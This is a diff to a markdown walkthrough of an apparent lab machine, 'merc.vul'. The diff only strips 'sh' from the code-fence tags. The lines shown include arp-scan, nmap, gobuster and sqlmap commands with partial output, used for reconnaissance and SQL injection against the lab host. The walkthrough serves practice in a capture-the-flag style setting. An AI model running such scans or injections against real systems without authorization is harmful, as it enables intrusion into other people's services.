@@ -5,7 +5,7 @@
 ### Command used: arp-scan<br>
 <br>
 
-```sh 
+```
 arp-scan --interface=ens33 --localnet
 
 Interface: ens33, type: EN10MB, MAC: 00:0c:29:01:a5:1c, IPv4: 172.16.250.97
@@ -20,7 +20,7 @@ Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
 ### Command used: nmap
 <br>
 
-```sh
+```
 nmap -T4 -sV -p22,8080 merc.vul
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 17:00 CDT
@@ -32,7 +32,7 @@ Host is up (0.00055s latency).
 ### Command used: gobuster
 <br>
 
-```sh
+```
 gobuster dir --url http://merc.vul:8080 --wordlist /usr/share/wordlists/dirb/common.txt
 ===============================================================
 Gobuster v3.1.0
@@ -53,7 +53,7 @@ NOTES AND STEPS:<br><br>
 ### Command used: SQLMap
 <br>
 
-```sh
+```
 sqlmap -u http://merc.vul:8080/mercuryfacts/1 --answers="follow=Y" --batch
 
       ___
